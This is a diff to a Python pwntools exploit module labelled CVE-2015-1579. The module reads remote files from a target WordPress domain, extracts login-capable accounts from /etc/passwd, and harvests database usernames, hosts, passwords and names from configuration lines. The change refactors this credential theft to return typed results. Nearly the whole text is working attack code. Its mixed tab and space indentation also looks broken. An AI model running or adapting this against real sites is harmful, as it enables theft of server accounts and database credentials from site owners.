@@ -2,15 +2,19 @@ from pwn import *
 import urllib2
 import sys
 from datetime import datetime
+from Convention import Convention
 
 def passive(domain):
     log.info('Trying CVE-2015-1579')
+
+    c = Convention()
 
     dico = ['DB','FTP','KEY','SALT','DOMAIN',]
     users = []
     serviceU = []
     passwords = []
 
+    retValue = []
     shadowFound = False
 
     p = log.progress('Remote Files')
@@ -34,7 +38,10 @@ def passive(domain):
                 if "false" not in line.split(':')[6] and "nologin" not in line.split(':')[6]:
                     u = line.split(':')[0]
                     if u != "sync" and u != "shutdown" and u != "halt" and u != "mysql":
-                        users.append(u)
+			retValue.append((c.SSH_User,u))
+		else:
+		    u = line.split(':')[0]
+		    retValue.append((c.Service_User,u))
             except:
                 pass
         try:
@@ -70,42 +77,25 @@ def passive(domain):
                 if term in line and len(line.split("'")) == 5:
                     description = line.split("'")[1]
                     value = line.split("'")[3]
-                    #log.success('Found a '+description+" : "+value)
-                    if "USER" in description: 
-                        serviceU.append(value)
+		    if "DB" in description:
+			if "DB_USER" in description:
+			    retValue.append((c.DB_User,value))
+			    retValue.append((c.User,value))
+			elif "DB_HOST" in description:
+			    retValue.append((c.DB_Host,value))
+			elif "DB_PASSWORD" in description:
+			    retValue.append((c.DB_Password,value))
+			    retValue.append((c.Password,value))
+			elif "DB_NAME" in description:
+			    retValue.append((c.DB_Name,value))
+                    elif "USER" in description: 
+                        retValue.append((c.User,value))
                     elif "PASS" in description and value not in passwords:
                         if value.replace(" ", ""):
                             passwords.append(value)
+		    else:
+			retValue.append((description,value))
                     break
-    if len(serviceU) > 0:
-        log.info('Found a total of '+str(len(serviceU))+' service users')
-
-    if len(users) > 0:
-        foundUsers = True
-        log.info('Found a total of '+str(len(users))+' users with login rights!')
-        userlist = ""
-        for user in users:
-            userlist += user+','
-        userlist = userlist[0:len(userlist)-1]
-        log.info(userlist)
-    	p.status("Prioritize wp-user")
-    	if "wp-user" in users:
-        	index = users.index("wp-user")
-        	users[index] = users[0]
-        	users[0] = "wp-user"
-    else:
-        log.failure('Could not find any user')
-    if len(passwords) > 0:
-        foundPasswords = True
-        log.info('Found a total of '+str(len(passwords))+' passwords!')    
-    else:
-        log.failure('No password found')
-
-    retValue = []
-    for user in users:
-        retValue.append(('user',user))
-    for passwd in passwords:
-        retValue.append(('password',passwd))
     if len(retValue) == 0:
         retValue = [("none",False)]
     return retValue
